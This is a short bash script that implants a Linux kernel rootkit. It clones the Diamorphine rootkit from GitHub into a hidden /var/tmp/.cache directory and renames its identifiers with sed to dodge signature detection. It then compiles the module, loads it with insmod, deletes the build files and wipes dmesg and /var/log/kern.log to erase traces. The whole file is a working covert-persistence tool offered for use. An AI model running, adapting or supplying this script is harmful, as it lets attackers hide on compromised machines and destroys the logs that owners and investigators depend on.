#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

command -v insmod >/dev/null 2>&1 || { echo >&2 "[ERROR] insmod command not found. Please install it."; exit 1; }
command -v gcc >/dev/null 2>&1 || { echo >&2 "[ERROR] gcc command not found. Please install it."; exit 1; }

dir() {
	mkdir -p  /var/tmp/.cache
}

get_rootkit(){
	git clone https://github.com/m0nad/Diamorphine /var/tmp/.cache
}

modify_rk(){
	mv /var/tmp/.cache/diamorphine.c /var/tmp/.cache/rk.c
	mv /var/tmp/.cache/diamorphine.h /var/tmp/.cache/rk.h
	sed -i 's/diamorphine_secret/demonized/g' /var/tmp/.cache/rk.h
	sed -i 's/diamorphine/demonizedmod/g' /var/tmp/.cache/rk.h
	sed -i 's/63/57/g' /var/tmp/.cache/rk.h
	sed -i 's/diamorphine.h/rk.h/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
	sed -i 's/diamorphine.o/rk.o/g' /var/tmp/.cache/Makefile
}

make_rk(){
	make -C /var/tmp/.cache/
}

load_rk(){
	insmod /var/tmp/.cache/rk.ko
}

clean_files(){
	make clean -C /var/tmp/.cache/
	rm -rf /var/tmp/.cache
}

remove_logs(){
	dmesg -C
	echo "" > /var/log/kern.log
}

clear

dir && get_rootkit && modify_rk && make_rk && load_rk && clean_files && remove_logs /

clear

scs="[*] Success! Rootkit has been implanted. [*]"

for i in $(seq 1 ${#scs}); do
        echo -ne "${scs:i-1:1}"
        sleep 0.08
done

echo -ne "\n"

clear
